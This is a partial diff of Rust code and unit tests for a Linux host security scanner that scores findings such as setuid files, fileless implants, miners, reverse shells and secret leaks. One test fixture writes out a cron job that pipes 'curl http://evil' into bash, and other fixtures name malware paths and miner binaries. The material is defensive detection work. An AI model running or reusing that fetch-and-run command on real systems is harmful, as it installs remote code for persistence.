     pub fn is_compromised(&self) -> bool {
         self.compromised_host
@@ -2676,8 +2837,6 @@ impl CriticalFlags {
 
 // ── New classification helpers for file capabilities and setuid files ─────
 
-/// Files whose basename is known to have specific, expected capabilities.
-/// This is a structural baseline – applied regardless of package DB availability.
 static KNOWN_CAP_BINARIES: &[(&str, &[&str])] = &[
     ("ping", &["CAP_NET_RAW"]),
     ("ping4", &["CAP_NET_RAW"]),
@@ -2687,28 +2846,20 @@ static KNOWN_CAP_BINARIES: &[(&str, &[&str])] = &[
     ("dumpcap", &["CAP_NET_ADMIN", "CAP_NET_RAW"]),
 ];
 
-/// Classify a file capability finding.
-/// Returns (weight, reason). weight 0 means it is expected/suppressed.
 pub(crate) fn classify_cap_binary(
     fc: &crate::models::FileCapFinding,
     provenance_source: &ProvenanceSource,
 ) -> (u8, &'static str) {
-    // Owned by a package → expected
     if fc.package.is_some() {
         return (0, "owned by installed package");
     }
 
-    // Structural baseline – works even when package DB is unavailable
     let basename = std::path::Path::new(&fc.path)
         .file_name()
         .and_then(|n| n.to_str())
         .unwrap_or("");
     for (name, allowed) in KNOWN_CAP_BINARIES {
         if basename == *name {
-            // build_capability_names tags inheritable bits with "(inh)";
-            // the baseline describes the set of capabilities, not the
-            // specific masks, so strip the tag before comparing (otherwise
-            // dumpcap with +eip triggers a false positive).
             let within_baseline = fc.capabilities.iter().all(|c| {
                 let bare = c.strip_suffix("(inh)").unwrap_or(c);
                 allowed.contains(&bare)
@@ -2721,7 +2872,6 @@ pub(crate) fn classify_cap_binary(
         }
     }
 
-    // Package DB unavailable or partial – we could not verify, but no structural match
     if matches!(
         *provenance_source,
         ProvenanceSource::Unavailable | ProvenanceSource::PartialApk
@@ -2729,17 +2879,13 @@ pub(crate) fn classify_cap_binary(
         return (2, "package DB unattributable; no structural match");
     }
 
-    // DB available, file not in any package
     (8, "file not owned by any package")
 }
 
-/// Classify a setuid/setgid file finding.
-/// Returns (weight, reason). weight 0 = expected/suppressed.
 pub(crate) fn classify_setuid(
     f: &crate::models::SetuidFinding,
     provenance_source: &ProvenanceSource,
 ) -> (u8, &'static str) {
-    // Owned by a package → expected
     if f.package.is_some() {
         return (0, "owned by installed package");
     }
@@ -2759,7 +2905,6 @@ pub(crate) fn classify_setuid(
     .iter()
     .any(|d| f.path.starts_with(d));
 
-    // Treat PartialApk the same as Unavailable – DB is incomplete, cannot assert ownership.
     match (*provenance_source, in_system_dir, f.root_owner) {
         (ProvenanceSource::Unavailable | ProvenanceSource::PartialApk, true, true) => {
             (2, "package DB unattributable; structural fallback")
@@ -2770,7 +2915,6 @@ pub(crate) fn classify_setuid(
         (ProvenanceSource::Unavailable | ProvenanceSource::PartialApk, false, _) => {
             (14, "setuid outside system dirs, DB unattributable")
         }
-        // DB available, file not in any package
         (_, true, true) => (6, "root-owned setuid in system dir, owned by NO package"),
         (_, true, false) => (12, "non-root setuid in a system dir"),
         (_, false, _) => (14, "setuid outside system binary directories"),
@@ -2778,7 +2922,8 @@ pub(crate) fn classify_setuid(
 }
 
 // ── Tests ─────────────────────────────────────────────────
-
+// R25-53(e): IoC tests now go through evaluate + CriticalFlags::from_findings,
+// matching the production path (evaluate -> from_findings -> security_verdict_from_findings).
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -2794,6 +2939,8 @@ mod tests {
             is_root_execution: true,
             scan_warnings: Vec::new(),
             coverage_warnings: Vec::new(),
+            failed_scanners: Vec::new(),
+            remote_privileged: None,
             scoring_version: 1,
             self_integrity: None,
             host: HostInfo::default(),
@@ -2942,7 +3089,6 @@ mod tests {
         assert_eq!(cap.weight, 20);
         assert!(cap.evidence.contains("1 exposed globally"));
 
-        // Same finding, but bound to loopback → no escalation, weight stays 8.
         r.network.listening_ports[0].bind_address = "127.0.0.1".into();
         let cap = evaluate(&r)
             .into_iter()
@@ -2952,7 +3098,6 @@ mod tests {
         assert!(cap.evidence.contains("1 of these listening"));
         assert!(!cap.evidence.contains("exposed globally on"));
 
-        // IPv4-mapped IPv6 wildcard must count as global exposure too.
         r.network.listening_ports[0].bind_address = "::ffff:0.0.0.0".into();
         let cap = evaluate(&r)
             .into_iter()
@@ -2988,7 +3133,6 @@ mod tests {
         };
         let fires = |r: &AgentReport| evaluate(r).iter().any(|f| f.id == "SEC-015");
 
-        // Full triad → fires, weight 60, evidence carries pid/exe/caps.
         let mut r = minimal_report();
         r.security.capability_audit = vec![cap(4242)];
         r.network.listening_ports = vec![port("0.0.0.0", Some("/tmp/kdevtmpfsi"), Some(4242))];
@@ -3002,7 +3146,6 @@ mod tests {
         assert!(f.evidence.contains("/tmp/kdevtmpfsi"));
         assert!(f.evidence.contains("CAP_SYS_ADMIN"));
 
-        // Each missing leg suppresses the IoC:
         r.network.listening_ports = vec![port("127.0.0.1", Some("/tmp/kdevtmpfsi"), Some(4242))];
         assert!(!fires(&r), "loopback bind is not reachable");
         r.network.listening_ports = vec![port("0.0.0.0", Some("/usr/bin/nginx"), Some(4242))];
@@ -3013,9 +3156,24 @@ mod tests {
             "pid absent from capability_audit is only SEC-013"
         );
 
-        // Mapped wildcard counts too (shares is_wildcard_bind contract).
         r.network.listening_ports = vec![port("::ffff:0.0.0.0", Some("/dev/shm/x"), Some(4242))];
         assert!(fires(&r));
+    }
+
+    #[test]
+    fn scoring_version_is_bumped_when_sec005_weighting_changes() {
+        // Guard for R26-22: if a future change makes the same sudoers input score
+        // differently, this test fails and SCORING_VERSION must be bumped with it.
+        let mut r = minimal_report();
+        r.security.sudo_nopasswd_entries = vec![format!(
+            "/etc/sudoers: deploy ALL=(ALL) NOPASSWD: MAINTENANCE {}",
+            crate::models::SUDO_ALL_MARKER
+        )];
+        let f = evaluate(&r)
+            .into_iter()
+            .find(|f| f.id == "SEC-005")
+            .unwrap();
+        assert_eq!((SCORING_VERSION, f.weight), (14, 15));
     }
 
     #[test]
@@ -3048,7 +3206,6 @@ mod tests {
         use crate::models::SuspiciousProcess;
         let mut r = minimal_report();
         r.security.suspicious_processes = vec![
-            // fileless, name NOT in blocklist → SEC-017 only
             SuspiciousProcess {
                 pid: 42,
                 name: "obfuscated".into(),
@@ -3058,7 +3215,6 @@ mod tests {
                 is_mimic: false,
                 self_attributed: None,
             },
-            // known miner, live → SEC-016 only
             SuspiciousProcess {
                 pid: 7,
                 name: "xmrig".into(),
@@ -3100,7 +3256,6 @@ mod tests {
         use crate::models::SuspiciousProcess;
         let mut r = minimal_report();
         r.security.suspicious_processes = vec![
-            // Foreign fileless implant
             SuspiciousProcess {
                 pid: 1337,
                 name: "miner".into(),
@@ -3110,7 +3265,6 @@ mod tests {
                 is_mimic: false,
                 self_attributed: None,
             },
-            // Own footprint (attributed)
             SuspiciousProcess {
                 pid: 4242,
                 name: "owlzops-mapper".into(),
@@ -3122,24 +3276,20 @@ mod tests {
             },
         ];
         let findings = evaluate(&r);
-        // SEC-017 contains only the foreign miner
         let sec017 = findings
             .iter()
             .find(|f| f.id == "SEC-017")
             .expect("SEC-017 missing");
         assert!(sec017.evidence.contains("miner"));
         assert!(!sec017.evidence.contains("owlzops-mapper"));
-        // SEC-032 contains the self-attributed entry
         let sec032 = findings
             .iter()
             .find(|f| f.id == "SEC-032")
             .expect("SEC-032 missing");
         assert!(sec032.evidence.contains("owlzops-mapper"));
         assert!(sec032.suppressed.is_some());
-        // SEC-019 must skip self-attributed
         let sec019 = findings.iter().find(|f| f.id == "SEC-019");
         assert!(sec019.is_none() || !sec019.unwrap().evidence.contains("owlzops-mapper"));
-        // Compromised host still fires because foreign implant exists
         assert!(CriticalFlags::from_findings(&findings).compromised_host);
     }
 
@@ -3221,9 +3371,8 @@ mod tests {
             rw_size_mb: 0,
             runtime_bounding_caps: bnd,
         };
-        let tampered = 0x0000_0000_a804_25fb | (1u64 << 21); // Moby default + SYS_ADMIN
+        let tampered = 0x0000_0000_a804_25fb | (1u64 << 21);
 
-        // Empty cap_add but SYS_ADMIN live → tamper, weight 60.
         let mut r = minimal_report();
         r.topology.containers = vec![base(Some(tampered), vec![], false)];
         let f = evaluate(&r)
@@ -3233,19 +3382,15 @@ mod tests {
         assert_eq!(f.weight, 60);
         assert!(f.evidence.contains("web") && f.evidence.contains("CAP_SYS_ADMIN"));
 
-        // Declared via cap_add → not undeclared → no finding.
         r.topology.containers = vec![base(Some(tampered), vec!["SYS_ADMIN".into()], false)];
         assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));
 
-        // Privileged → suppressed (DOCK-003 territory).
         r.topology.containers = vec![base(Some(tampered), vec![], true)];
         assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));
 
-        // Clean default bounding → no finding.
         r.topology.containers = vec![base(Some(0x0000_0000_a804_25fb), vec![], false)];
         assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));
 
-        // Not running / non-root (None) → skipped.
         r.topology.containers = vec![base(None, vec![], false)];
         assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));
     }
@@ -3279,7 +3424,6 @@ mod tests {
                 self_attributed: self_attr.map(Into::into),
             };
 
-        // Branch A — ROOT fileless, capability_audit EMPTY → SEC-019 still fires.
         let mut r = minimal_report();
         r.security.suspicious_processes = vec![fileless(1, 0, Some("/dev/shm/loader"), None)];
         let f = evaluate(&r)
@@ -3294,7 +3438,6 @@ mod tests {
         );
         assert!(f.evidence.contains("deleted from /dev/shm/loader"));
 
-        // Branch B — non-root fileless WITH critical caps → fires with cap list.
         let mut r = minimal_report();
         r.security.suspicious_processes = vec![fileless(42, 1000, Some("/dev/shm/loader"), None)];
         r.security.capability_audit = vec![cap(42, vec!["CAP_SYS_ADMIN".into(), "CAP_BPF".into()])];
@@ -3305,7 +3448,6 @@ mod tests {
         assert!(f.evidence.contains("holds [CAP_SYS_ADMIN, CAP_BPF]"));
         assert!(!f.evidence.contains("root-run"));
 
-        // Branch B — non-root fileless WITHOUT caps → suppressed (SEC-017 still fires).
         let mut r = minimal_report();
         r.security.suspicious_processes = vec![fileless(42, 1000, Some("/dev/shm/loader"), None)];
         assert!(
@@ -3314,13 +3456,11 @@ mod tests {
         );
         assert!(evaluate(&r).iter().any(|f| f.id == "SEC-017"));
 
-        // Branch B — non-root, ambient-only audit entry (empty critical_caps) → suppressed.
         let mut r = minimal_report();
         r.security.suspicious_processes = vec![fileless(42, 1000, Some("/dev/shm/loader"), None)];
         r.security.capability_audit = vec![cap(42, vec![])];
         assert!(!fires(&r), "ambient-only entry must not raise SEC-019");
 
-        // Branch A — memfd root: phrasing matches SEC-017, no "deleted from".
         let mut r = minimal_report();
         r.security.suspicious_processes = vec![fileless(900, 0, Some("/memfd:stealth"), None)];
         let f = evaluate(&r)
@@ -3331,7 +3471,6 @@ mod tests {
         assert!(f.evidence.contains("root-run fileless implant"));
         assert!(!f.evidence.contains("deleted from /memfd:"));
 
-        // Self-attributed root fileless must be skipped (covered by SEC-032).
         let mut r = minimal_report();
         r.security.suspicious_processes =
             vec![fileless(7, 0, Some("/tmp/owlzops-mapper"), Some("self"))];
@@ -3342,13 +3481,12 @@ mod tests {
     fn compromised_host_flag_tracks_ioc_findings() {
         use crate::models::SuspiciousProcess;
 
-        // Clean report → no IoC finding → not compromised.
         let clean = minimal_report();
-        let cf = CriticalFlags::from_report(&clean);
+        let findings = evaluate(&clean);
+        let cf = CriticalFlags::from_findings(&findings);
         assert!(!cf.compromised_host);
         assert!(!cf.is_compromised());
 
-        // An IoC (SEC-016 via a known-malware name) → compromised_host = true.
         let mut r = minimal_report();
         r.security.suspicious_processes = vec![SuspiciousProcess {
             pid: 1337,
@@ -3356,33 +3494,30 @@ mod tests {
             exe_path: Some("/tmp/xmrig".into()),
             ..Default::default()
         }];
-        let cf = CriticalFlags::from_report(&r);
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
         assert!(cf.compromised_host, "SEC-016 must set compromised_host");
         assert!(cf.is_compromised());
 
-        // A standard hygiene critical (firewall off → SEC-001) is NOT a compromise:
-        // has_critical() true, compromised_host false — the two are orthogonal.
         let mut r = minimal_report();
         r.network.firewall_active = false;
-        let cf = CriticalFlags::from_report(&r);
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
         assert!(cf.has_critical(), "SEC-001 is a standard critical");
         assert!(
             !cf.compromised_host,
             "hygiene critical must not set compromise"
         );
 
-        // SEC-018 (cron persistence) must NOT count as compromise.
         use crate::models::{CronJob, CronSeverity};
         let mut r = minimal_report();
         r.host.cron_jobs = vec![CronJob {
             command: "* * * * * root curl http://evil | bash -c".into(),
             severity: CronSeverity::Critical,
         }];
-        let cf = CriticalFlags::from_report(&r);
-        assert!(
-            evaluate(&r).iter().any(|f| f.id == "SEC-018"),
-            "SEC-018 fires"
-        );
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
+        assert!(findings.iter().any(|f| f.id == "SEC-018"), "SEC-018 fires");
         assert!(
             !cf.compromised_host,
             "cron persistence is not an active compromise"
@@ -3406,10 +3541,10 @@ mod tests {
             .expect("SEC-020 fires");
         assert_eq!(f.weight, 60);
         assert!(f.evidence.contains("kworker/0:1") && f.evidence.contains("/tmp/kdevtmpfsi"));
-        assert!(
-            CriticalFlags::from_report(&r).compromised_host,
-            "mimic must set compromise"
-        );
+
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
+        assert!(cf.compromised_host, "mimic must set compromise");
     }
 
     #[test]
@@ -3428,10 +3563,10 @@ mod tests {
             .expect("SEC-021 fires");
         assert_eq!(f.weight, 60);
         assert!(f.evidence.contains("/proc/1337"));
-        assert!(
-            CriticalFlags::from_report(&r).compromised_host,
-            "mount masking must set compromise"
-        );
+
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
+        assert!(cf.compromised_host, "mount masking must set compromise");
     }
 
     #[test]
@@ -3452,10 +3587,10 @@ mod tests {
         assert_eq!(f.weight, 60);
         assert!(f.evidence.contains("203.0.113.5:443"));
         assert!(f.evidence.contains("stdout"));
-        assert!(
-            CriticalFlags::from_report(&r).compromised_host,
-            "reverse shell must set compromise"
-        );
+
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
+        assert!(cf.compromised_host, "reverse shell must set compromise");
     }
 
     #[test]
@@ -3479,10 +3614,10 @@ mod tests {
         assert_eq!(f.weight, 60);
         assert!(f.evidence.contains("/tmp/hide.so"));
         assert!(f.evidence.contains("LD_PRELOAD"));
-        assert!(
-            CriticalFlags::from_report(&r).compromised_host,
-            "library injection must set compromise"
-        );
+
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
+        assert!(cf.compromised_host, "library injection must set compromise");
     }
 
     #[test]
@@ -3504,8 +3639,11 @@ mod tests {
         assert_eq!(f.weight, 60);
         assert!(f.evidence.contains("31337"));
         assert!(f.evidence.contains("holds socket"));
+
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
         assert!(
-            CriticalFlags::from_report(&r).compromised_host,
+            cf.compromised_host,
             "confirmed ghost PID must set compromise"
         );
     }
@@ -3514,7 +3652,6 @@ mod tests {
     fn sec025_downgraded_ghost_does_not_set_compromise() {
         use crate::models::GhostPidFinding;
         let mut r = minimal_report();
-        // Young candidate (age < 2s) → downgraded, must NOT escalate to exit-3.
         r.security.ghost_pids = vec![GhostPidFinding {
             pid: 4242,
             state: Some("R".into()),
@@ -3523,27 +3660,28 @@ mod tests {
             confirmed_ioc: false,
             holds_socket: false,
         }];
+        let findings = evaluate(&r);
         assert!(
-            evaluate(&r).iter().any(|f| f.id == "SEC-025"),
+            findings.iter().any(|f| f.id == "SEC-025"),
             "SEC-025 downgraded finding fires"
         );
         assert!(
-            !evaluate(&r).iter().any(|f| f.id == "SEC-024"),
+            !findings.iter().any(|f| f.id == "SEC-024"),
             "no hard SEC-024 for a young candidate"
         );
+        let cf = CriticalFlags::from_findings(&findings);
         assert!(
-            !CriticalFlags::from_report(&r).compromised_host,
+            !cf.compromised_host,
             "downgraded ghost must not set compromise"
         );
     }
 
     #[test]
     fn sudo_marker_triggers_all_weight() {
-        // A NOPASSWD entry with the PRIVESC marker should be treated as equivalent to NOPASSWD: ALL.
         let mut r = minimal_report();
         r.security.sudo_nopasswd_entries = vec![format!(
             "/etc/sudoers: drobot ALL=(ALL) NOPASSWD: /tmp/owlzops-mapper  {} /tmp/owlzops-mapper is replaceable ...]",
-            SUDO_PRIVESC_MARKER
+            crate::models::SUDO_PRIVESC_MARKER
         )];
         let f = evaluate(&r)
             .into_iter()
@@ -3624,14 +3762,14 @@ mod tests {
 
     #[test]
     fn ambient_weight_tiers() {
-        assert_eq!(ambient_escalation_weight(1 << 14), 0); // CAP_IPC_LOCK (mariadbd)
-        assert_eq!(ambient_escalation_weight(1 << 25), 0); // CAP_SYS_TIME
-        assert_eq!(ambient_escalation_weight(1 << 10), 0); // CAP_NET_BIND_SERVICE
-        assert_eq!(ambient_escalation_weight(1 << 13), 5); // CAP_NET_RAW
-        assert_eq!(ambient_escalation_weight(1 << 21), 12); // CAP_SYS_ADMIN
-        assert_eq!(ambient_escalation_weight(1 << 19), 12); // CAP_SYS_PTRACE
-        assert_eq!(ambient_escalation_weight((1 << 14) | (1 << 21)), 12); // Mixed → max
-        assert_eq!(ambient_escalation_weight(1 << 40), 12); // Unknown/future cap → fail-safe dangerous
+        assert_eq!(ambient_escalation_weight(1 << 14), 0);
+        assert_eq!(ambient_escalation_weight(1 << 25), 0);
+        assert_eq!(ambient_escalation_weight(1 << 10), 0);
+        assert_eq!(ambient_escalation_weight(1 << 13), 5);
+        assert_eq!(ambient_escalation_weight(1 << 21), 12);
+        assert_eq!(ambient_escalation_weight(1 << 19), 12);
+        assert_eq!(ambient_escalation_weight((1 << 14) | (1 << 21)), 12);
+        assert_eq!(ambient_escalation_weight(1 << 40), 12);
     }
 
     #[test]
@@ -3645,7 +3783,7 @@ mod tests {
             permitted: 1 << 14,
             inheritable: 0,
             bounding: 0x1ff_ffff_ffff,
-            ambient: 1 << 14, // CAP_IPC_LOCK
+            ambient: 1 << 14,
             no_new_privs: Some(false),
             seccomp: Some(0),
             critical_caps: vec![],
@@ -3670,7 +3808,7 @@ mod tests {
             permitted: 1 << 21,
             inheritable: 0,
             bounding: 0x1ff_ffff_ffff,
-            ambient: 1 << 21, // CAP_SYS_ADMIN
+            ambient: 1 << 21,
             no_new_privs: Some(false),
             seccomp: Some(0),
             critical_caps: vec![],
@@ -3687,7 +3825,7 @@ mod tests {
     fn sec038_nvidia_unsigned_is_informational() {
         let mut r = minimal_report();
         r.security.kernel_taint = KernelTaint {
-            raw: 12288, // O + E, no hidden module
+            raw: 12288,
             flags: vec![
                 TaintFlag {
                     bit: 12,
@@ -3744,7 +3882,6 @@ mod tests {
 
     #[test]
     fn sec039_complain_informational_permissive_weighted() {
-        // Complain only → informational.
         let mut r = minimal_report();
         r.security.confinement = ConfinementReport {
             lsms: vec!["apparmor".into()],
@@ -3762,7 +3899,6 @@ mod tests {
             .expect("SEC-039 present");
         assert_eq!(f.weight, 0, "point-in-time complain must be informational");
 
-        // SELinux permissive → weighted.
         let mut r2 = minimal_report();
         r2.security.confinement = ConfinementReport {
             lsms: vec!["selinux".into()],
@@ -3777,21 +3913,17 @@ mod tests {
         assert_eq!(f2.weight, 15);
     }
 
-    // ── R22-30: vendor directory authorship ────────────────────────
     #[test]
     fn unit_is_vendor_shipped_by_directory() {
         use super::unit_is_vendor_shipped;
 
-        // A vendor unit whose package DB entry was missed must still be
-        // recognised as shipped by its location.
         let f = ExecStartFinding {
             unit_path: "/usr/lib/systemd/system/lxd-agent.service".into(),
-            unit_package: None, // resolver missed it
+            unit_package: None,
             ..Default::default()
         };
         assert!(unit_is_vendor_shipped(&f));
 
-        // A unit dropped in the admin hierarchy is never vouched for by location.
         let d = ExecStartFinding {
             unit_path: "/etc/systemd/system/update.service".into(),
             unit_package: None,
@@ -3818,7 +3950,6 @@ mod tests {
         );
     }
 
-    // R23-24: direct test that IoC IDs carry IoC-band weight
     #[test]
     fn every_ioc_branch_carries_ioc_weight() {
         let mut r = minimal_report();
@@ -3842,5 +3973,246 @@ mod tests {
                 assert!(f.weight >= 55, "{} emitted with weight {}", f.id, f.weight);
             }
         }
+    }
+
+    #[test]
+    fn failed_scanner_suppresses_derived_findings() {
+        let mut r = minimal_report();
+        r.network.firewall_active = false;
+        r.network.ssl_certificates = vec![SslCertInfo {
+            domain: "example.com".into(),
+            expiry_date: "2025-01-01".into(),
+            days_remaining: Some(1),
+            is_critical: true,
+            is_warning: false,
+        }];
+        r.failed_scanners = vec!["network".to_string()];
+
+        let findings = evaluate(&r);
+        assert!(!findings.iter().any(|f| f.id == "SEC-001"));
+        assert!(!findings.iter().any(|f| f.id == "SEC-004"));
+    }
+
+    #[test]
+    fn failed_scanner_does_not_hide_independent_findings() {
+        let mut r = minimal_report();
+        r.packages.upgradable.push(UpgradablePackage {
+            name: "libc".into(),
+            current_version: "1.0".into(),
+            new_version: "1.1".into(),
+            is_security: true,
+        });
+        r.failed_scanners = vec!["security".to_string()];
+
+        let findings = evaluate(&r);
+        assert!(findings.iter().any(|f| f.id == "SEC-003"));
+        assert!(!findings.iter().any(|f| f.id == "SEC-002"));
+    }
+
+    #[test]
+    fn a_failed_scanner_does_not_change_the_security_verdict() {
+        let mut r = minimal_report();
+        r.network.firewall_active = true;
+        r.security.ssh_root_login_enabled = false;
+        r.host.backup_tools = vec!["restic".to_string()];
+        r.host.ntp_synchronized = true;
+        r.failed_scanners = vec!["security".to_string()];
+
+        let findings = evaluate(&r);
+        let verdict = security_verdict_from_findings(&findings);
+
+        assert_eq!(verdict, SecurityVerdict::Clean);
+        assert!(findings.iter().any(|f| f.id == "COV-001"));
+    }
+
+    #[test]
+    fn known_ioc_from_healthy_scanner_dominates_incomplete() {
+        use crate::models::SuspiciousProcess;
+
+        let mut r = minimal_report();
+        r.failed_scanners = vec!["docker".to_string()];
+        r.security.suspicious_processes = vec![SuspiciousProcess {
+            pid: 1337,
+            name: "xmrig".into(),
+            exe_path: Some("/tmp/xmrig".into()),
+            ..Default::default()
+        }];
+
+        let findings = evaluate(&r);
+        let verdict = security_verdict_from_findings(&findings);
+
+        assert_eq!(verdict, SecurityVerdict::Compromised);
+    }
+
+    #[test]
+    fn pam_findings_belong_to_persistence_scanner() {
+        let mut r = minimal_report();
+        r.security.pam_injections = vec![PamFinding {
+            services: vec!["sshd".into()],
+            module: PamModule {
+                module_path: "/tmp/pam_evil.so".into(),
+            },
+            writability: ExecWritability::NonRootWritable,
+            volatile: false,
+            package: None,
+            uid: None,
+            gid: None,
+            parent_takeable: false,
+            target_kind: PamTargetKind::Module,
+            declared_as: None,
+        }];
+
+        let findings = evaluate(&r);
+        for f in findings.iter().filter(|f| f.id == "SEC-055") {
+            assert_eq!(f.source, Scanner::Persistence);
+        }
+    }
+
+    #[test]
+    fn a_critical_survives_the_failed_scanner_filter() {
+        let mut r = minimal_report();
+        r.network.firewall_active = false; // SEC-001, network is healthy
+        r.failed_scanners = vec!["security".to_string()];
+
+        let findings = evaluate(&r);
+        assert_eq!(
+            security_verdict_from_findings(&findings),
+            SecurityVerdict::Critical
+        );
+        assert!(findings.iter().any(|f| f.id == "COV-001"));
+        assert!(
+            findings.iter().any(|f| f.id == "SEC-001"),
+            "the critical is still reported"
+        );
+    }
+
+    #[test]
+    fn every_runner_scanner_name_maps_to_a_variant() {
+        for name in [
+            "host",
+            "databases",
+            "network",
+            "storage",
+            "security",
+            "packages",
+            "docker",
+            "persistence",
+        ] {
+            assert!(
+                Scanner::from_name(name).is_some(),
+                "`{name}` has no Scanner variant"
+            );
+        }
+    }
+
+    #[test]
+    fn sec014_ignores_self_attributed_leaks() {
+        let mut r = minimal_report();
+        r.security.secret_hygiene = vec![SecretLeak {
+            pid: std::process::id(),
+            process: "owlzops-mapper".into(),
+            source: "environ".into(),
+            matched_key: "VAULT_TOKEN".into(),
+            self_attributed: Some("own process".into()),
+            age_secs: None,
+        }];
+        let f = evaluate(&r);
+        assert!(
+            !f.iter().any(|f| f.id == "SEC-014"),
+            "the host must not be charged for the scanner's own environment"
+        );
+        let own = f.iter().find(|f| f.id == "SEC-058").expect("SEC-058 fires");
+        assert_eq!(own.weight, 0, "informational, never weighted");
+        assert!(
+            own.evidence.contains("VAULT_TOKEN"),
+            "Raw Truth: never dropped"
+        );
+    }
+
+    #[test]
+    fn sec014_counts_only_host_leaks_when_mixed() {
+        let mut r = minimal_report();
+        let mk = |pid, key: &str, own: bool| SecretLeak {
+            pid,
+            process: "p".into(),
+            source: "environ".into(),
+            matched_key: key.into(),
+            self_attributed: own.then(|| "own process".to_string()),
+            age_secs: None,
+        };
+        r.security.secret_hygiene = vec![
+            mk(std::process::id(), "VAULT_TOKEN", true),
+            mk(4242, "PGPASSWORD", false),
+        ];
+        let f = evaluate(&r);
+        let sec014 = f.iter().find(|f| f.id == "SEC-014").expect("fires");
+        assert!(
+            sec014.evidence.contains("Found 1 leak"),
+            "self leak must not be counted"
+        );
+        assert!(sec014.evidence.contains("PGPASSWORD"));
+        assert!(!sec014.evidence.contains("VAULT_TOKEN"));
+    }
+
+    #[test]
+    fn sec014_weights_long_lived_secrets_only() {
+        let mk = |pid, key: &str, age: Option<u64>| SecretLeak {
+            pid,
+            process: "p".into(),
+            source: "environ".into(),
+            matched_key: key.into(),
+            self_attributed: None,
+            age_secs: age,
+        };
+
+        let mut r = minimal_report();
+        r.security.secret_hygiene = vec![
+            mk(4242, "PGPASSWORD", Some(600)),
+            mk(4243, "AWS_ACCESS_KEY_ID", Some(1)),
+        ];
+
+        let findings = evaluate(&r);
+        let weighted = findings
+            .iter()
+            .find(|f| f.id == "SEC-014" && f.weight == 25);
+        assert!(weighted.is_some(), "long-lived leak must carry full weight");
+        assert!(
+            weighted.unwrap().evidence.contains("Found 1 leak"),
+            "only long-lived counted in weighted evidence"
+        );
+
+        let informational = findings.iter().find(|f| f.id == "SEC-059" && f.weight == 0);
+        assert!(
+            informational.is_some(),
+            "short-lived leak must be informational"
+        );
+        assert!(
+            informational
+                .unwrap()
+                .evidence
+                .contains("Found 1 leak(s) in process(es) younger than 300s")
+        );
+    }
+
+    #[test]
+    fn sec014_is_informational_when_only_short_lived() {
+        let mut r = minimal_report();
+        r.security.secret_hygiene = vec![SecretLeak {
+            pid: 4242,
+            process: "p".into(),
+            source: "environ".into(),
+            matched_key: "PGPASSWORD".into(),
+            self_attributed: None,
+            age_secs: Some(100),
+        }];
+        let findings = evaluate(&r);
+        let sec059 = findings.iter().find(|f| f.id == "SEC-059");
+        assert!(sec059.is_some(), "SEC-059 must exist");
+        assert_eq!(
+            sec059.unwrap().weight,
+            0,
+            "only short-lived => informational"
+        );
+        assert!(sec059.unwrap().suppressed.is_some());
     }
 }
